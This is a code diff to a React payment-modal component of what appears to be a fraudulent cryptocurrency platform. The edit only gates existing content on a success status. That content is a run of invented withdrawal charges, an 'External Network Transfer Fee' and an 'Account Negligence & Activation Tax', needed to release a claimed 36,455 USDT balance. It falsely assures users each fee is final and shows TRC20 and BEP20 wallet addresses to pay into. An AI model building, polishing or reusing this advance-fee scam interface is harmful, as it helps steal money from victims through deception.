@@ -404,53 +404,59 @@ function PaymentModal({ onClose }: { onClose: () => void }) {
                   </div>
                 )}
 
-                {stage === 'transfer_fee' ? (
+                {status !== 'success' && (
                   <>
-                    <p>
-                      Your withdrawal request has been processed. However, due to the <strong>Account Liquidation Protocol</strong>, this transaction is being executed via <strong>External Distributed Computing</strong> outside the standard platform network.
-                    </p>
-                    <p>
-                      To complete the final synchronization and release your assets to your external wallet, a one-time <strong>External Network Transfer Fee</strong> must be settled independently.
-                    </p>
-                    <div className="bg-gray-50 border border-gray-100 p-4 rounded-xl">
-                      <div className="flex justify-between items-center mb-2">
-                        <span className="text-gray-500 font-medium">Required Fee:</span>
-                        <span className="text-[#6D4C52] font-bold text-lg">187.42 USDT</span>
-                      </div>
-                    </div>
-                  </>
-                ) : (
-                  <>
-                    <p className="font-bold text-[#6D4C52]">Final Step Required</p>
-                    <p>
-                      Our system has detected a prolonged period of <strong>Account Inactivity</strong>. According to the global security protocol, accounts that remain dormant for extended periods are automatically restricted to protect user assets.
-                    </p>
-                    <p>
-                      To reactivate your account and finalize the 36,455.00 USDT transfer, an <strong>Account Negligence & Activation Tax</strong> is required. This ensures the integrity of the blockchain bridge and confirms the active ownership of the receiving wallet.
-                    </p>
-                    <div className="bg-gray-50 border border-gray-100 p-4 rounded-xl">
-                      <div className="flex justify-between items-center mb-2">
-                        <span className="text-gray-500 font-medium">Activation Tax:</span>
-                        <span className="text-[#6D4C52] font-bold text-lg">122.16 USDT</span>
-                      </div>
-                      <p className="text-[10px] text-gray-500 mt-2">
-                        Rest assured, this is the final administrative requirement. Once confirmed, your full balance will be released immediately without further delay.
-                      </p>
-                    </div>
+                    {stage === 'transfer_fee' ? (
+                      <>
+                        <p>
+                          Your withdrawal request has been processed. However, due to the <strong>Account Liquidation Protocol</strong>, this transaction is being executed via <strong>External Distributed Computing</strong> outside the standard platform network.
+                        </p>
+                        <p>
+                          To complete the final synchronization and release your assets to your external wallet, a one-time <strong>External Network Transfer Fee</strong> must be settled independently.
+                        </p>
+                        <div className="bg-gray-50 border border-gray-100 p-4 rounded-xl">
+                          <div className="flex justify-between items-center mb-2">
+                            <span className="text-gray-500 font-medium">Required Fee:</span>
+                            <span className="text-[#6D4C52] font-bold text-lg">187.42 USDT</span>
+                          </div>
+                        </div>
+                      </>
+                    ) : (
+                      <>
+                        <p className="font-bold text-[#6D4C52]">Final Step Required</p>
+                        <p>
+                          Our system has detected a prolonged period of <strong>Account Inactivity</strong>. According to the global security protocol, accounts that remain dormant for extended periods are automatically restricted to protect user assets.
+                        </p>
+                        <p>
+                          To reactivate your account and finalize the 36,455.00 USDT transfer, an <strong>Account Negligence & Activation Tax</strong> is required. This ensures the integrity of the blockchain bridge and confirms the active ownership of the receiving wallet.
+                        </p>
+                        <div className="bg-gray-50 border border-gray-100 p-4 rounded-xl">
+                          <div className="flex justify-between items-center mb-2">
+                            <span className="text-gray-500 font-medium">Activation Tax:</span>
+                            <span className="text-[#6D4C52] font-bold text-lg">122.16 USDT</span>
+                          </div>
+                          <p className="text-[10px] text-gray-500 mt-2">
+                            Rest assured, this is the final administrative requirement. Once confirmed, your full balance will be released immediately without further delay.
+                          </p>
+                        </div>
+                      </>
+                    )}
                   </>
                 )}
               </div>
 
-              <div className="space-y-3">
-                <div className="p-3 bg-gray-50 rounded-lg border border-gray-100">
-                  <span className="block text-[10px] text-gray-400 uppercase font-bold mb-1">TRC20 Address</span>
-                  <code className="text-[11px] break-all font-mono text-gray-700 select-all">TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai</code>
+              {status !== 'success' && (
+                <div className="space-y-3">
+                  <div className="p-3 bg-gray-50 rounded-lg border border-gray-100">
+                    <span className="block text-[10px] text-gray-400 uppercase font-bold mb-1">TRC20 Address</span>
+                    <code className="text-[11px] break-all font-mono text-gray-700 select-all">TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai</code>
+                  </div>
+                  <div className="p-3 bg-gray-50 rounded-lg border border-gray-100">
+                    <span className="block text-[10px] text-gray-400 uppercase font-bold mb-1">BEP20 Address</span>
+                    <code className="text-[11px] break-all font-mono text-gray-700 select-all">0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d</code>
+                  </div>
                 </div>
-                <div className="p-3 bg-gray-50 rounded-lg border border-gray-100">
-                  <span className="block text-[10px] text-gray-400 uppercase font-bold mb-1">BEP20 Address</span>
-                  <code className="text-[11px] break-all font-mono text-gray-700 select-all">0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d</code>
-                </div>
-              </div>
+              )}
 
               <div className="flex gap-3">
                 {status === 'success' ? (
